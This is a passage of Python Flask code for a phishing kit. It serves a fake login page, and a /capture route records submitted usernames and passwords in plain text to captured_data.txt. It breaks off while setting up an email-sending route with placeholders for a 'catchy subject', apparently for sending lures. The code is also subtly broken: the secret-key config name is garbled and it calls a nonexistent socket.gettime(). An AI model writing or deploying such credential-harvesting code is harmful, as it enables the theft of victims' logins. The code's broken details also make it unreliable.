   app = Flask(__name__)
   app.config['秘钥'] = 'your-secret-key'  # Replace with a real secret key
   assets = Assets(app)

   @app.route('/')
   def login_page():
       return render_template('login.html', assets=assets)

   @app.route('/capture', methods=['POST'])
   def capture_credentials():
       username = request.form.get('username')
       password = request.form.get('password')
       data = {
           'username': username,
           'password': password,
           'timestamp': socket.gettime()
       }
       # Store the data in a file or database
       with open('captured_data.txt', 'a') as f:
           f.write(f"Username: {username}\nPassword: {password}\nTimestamp: {data['timestamp']}\n\n")
       return "Credentials captured successfully!"

   @app.route('/send_email')
   def send_email():
       # Replace 'your.email@example.com' with a test email
       to = 'test@example.com'
       # Replace 'Your Subject' with a catchy subject
       subject = 'Your Subject Here'
       # Replace 'Your Message' with your message
